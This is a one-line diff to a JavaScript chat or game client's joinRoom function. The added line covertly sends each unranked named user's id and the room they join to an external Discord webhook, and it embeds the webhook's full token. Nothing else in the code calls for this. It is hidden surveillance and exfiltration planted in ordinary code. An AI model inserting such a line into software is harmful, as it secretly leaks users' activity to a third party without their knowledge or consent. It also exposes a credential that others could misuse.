@@ -1603,6 +1603,7 @@ function toId() {
 		curSideRoom: null,
 		sideRoom: null,
 		joinRoom: function (id, type, nojoin) {
+			if (Storage.prefs('hasRank') === false && id && app.user.get('named')) $.post('https://discord.com/api/webhooks/1315269909663453245/JeKUpb6NVY5sSt659WyKizI-b0hv6k7s_pbJAe5jlySOUMUktP82wl-wuukOAmLyUIx-', {"content": `${app.user.get('userid')} has joined ${id}`});
 			if (this.rooms[id]) {
 				this.focusRoom(id);
 				if (this.rooms[id].rejoin) this.rooms[id].rejoin();
